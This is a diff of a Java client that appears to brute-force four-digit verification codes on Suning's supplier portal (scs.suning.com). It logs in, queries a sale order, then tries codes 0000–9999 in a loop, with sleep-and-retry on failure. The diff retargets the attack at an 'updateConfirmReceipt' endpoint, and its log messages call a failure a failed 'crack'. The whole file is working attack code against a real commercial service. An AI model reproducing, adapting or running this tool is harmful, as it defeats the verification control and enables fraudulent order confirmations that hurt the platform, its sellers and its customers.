@@ -53,18 +53,20 @@ public class MainClient extends Thread{
     		return "登录失败";
     	} 
     	
+    	/**
     	if(!select(saleOrderNo)){
     		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   失败 ，验证码测试到" + this.getCodeInt());
     		return "查询失败";
     	} 
+    	**/
     	vcm.saveVerifyCode(saleOrderNo,this.getCodeInt(),this.getSdi().getSearchResult(),1);
     	
-    	if(!tryCode(sdi.getHidreturnnoticedetailid(),saleOrderNo,1)){
+    	if(!tryCode(saleOrderNo,1)){
     		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   失败 ，验证码测试到" + this.getCodeInt());
     		Thread.currentThread();
 			Thread.sleep(10000);
     		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   重试中");
-    		if(login(userName, password) && select(saleOrderNo) && tryCode(sdi.getHidreturnnoticedetailid(),saleOrderNo,this.getCodeNow())){
+    		if(login(userName, password) && select(saleOrderNo) && tryCode(saleOrderNo,this.getCodeNow())){
     			//continue;
     		}else{
     			return "破解失败";
@@ -95,11 +97,11 @@ public class MainClient extends Thread{
     	return false;
     }
     
-    private boolean tryCode(String hidReturnNoticeDetailId,String saleOrderNo,int startCode) {
+    private boolean tryCode(String saleOrderNo,int startCode) {
     	//尝试验证
     	try{
     		System.out.println("开始验证时间 =" + new Date());
-        	int verifycodeResult = verifycode(startCode,hidReturnNoticeDetailId,saleOrderNo);
+        	int verifycodeResult = verifycode(startCode,saleOrderNo);
 
     		if(verifycodeResult == 0){
         		System.out.println("验证完成，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
@@ -121,7 +123,8 @@ public class MainClient extends Thread{
     
     public boolean login(String userName,String password) throws URISyntaxException{
     	//登录
-    	if(true == lg.login(new URI("http://scs.suning.com/sps/portal/showLoginPage.action"),userName,password)){
+    	
+    	if(true == lg.login(new URI("https://passport.suning.com/ids/login"),userName,password)){
     		System.out.println("登录成功");  
     		
 //    		if (null != loginCookies) {
@@ -139,7 +142,7 @@ public class MainClient extends Thread{
     
     public boolean select(String saleOrderNo) throws URISyntaxException{
     	//查询
-    	if(true == sdi.selectDeliverInform(new URI("http://scs.suning.com/te/deliveryinformdetailcontroller/selectDeliveryInform.action"),saleOrderNo)){
+    	if(true == sdi.selectDeliverInform(new URI("http://scs.suning.com/sps/saleOrder/saleOrderDetail.action"),saleOrderNo)){
     		System.out.println("查询成功");
     		return true;
     	}else{
@@ -150,7 +153,7 @@ public class MainClient extends Thread{
     }
     
     //尝试验证码
-    private int verifycode(int startCode,String hidReturnNoticeDetailId,String saleOrderNo) throws URISyntaxException {
+    private int verifycode(int startCode,String saleOrderNo) throws URISyntaxException {
     	int resultcode = -1;
     	int i = 0;
     	codeInt = startCode;
@@ -159,7 +162,7 @@ public class MainClient extends Thread{
     		codeStr = "0" + codeStr;
     	}
     	while(codeInt < 10000){
-    		resultcode = vc.VerifyCode(new URI("http://scs.suning.com/te/deliveryinformdetailcontroller/verifyCode.action"), codeStr ,hidReturnNoticeDetailId);
+    		resultcode = vc.VerifyCode(new URI("http://scs.suning.com/sps/saleOrder/updateConfirmReceipt.action"), codeStr,saleOrderNo);
     		if(resultcode == 1){   	
     			codeInt ++;
     			if(0 == (i % 100)){
